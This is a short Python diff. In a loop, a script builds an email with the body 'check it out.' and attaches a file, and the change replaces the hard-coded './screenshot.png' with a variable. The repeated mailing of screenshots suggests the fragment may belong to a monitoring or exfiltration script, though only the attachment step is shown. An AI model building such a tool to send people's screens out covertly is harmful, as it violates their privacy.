@@ -34,7 +34,7 @@ while True:
     body = MIMEText('check it out.', _charset='utf-8')
     msg.attach(body)
 
-    f = './screenshot.png'
+    f = filename
     part = MIMEBase('application', "octet-stream")
     part.set_payload(open(f, "rb").read())
     encode_base64(part)
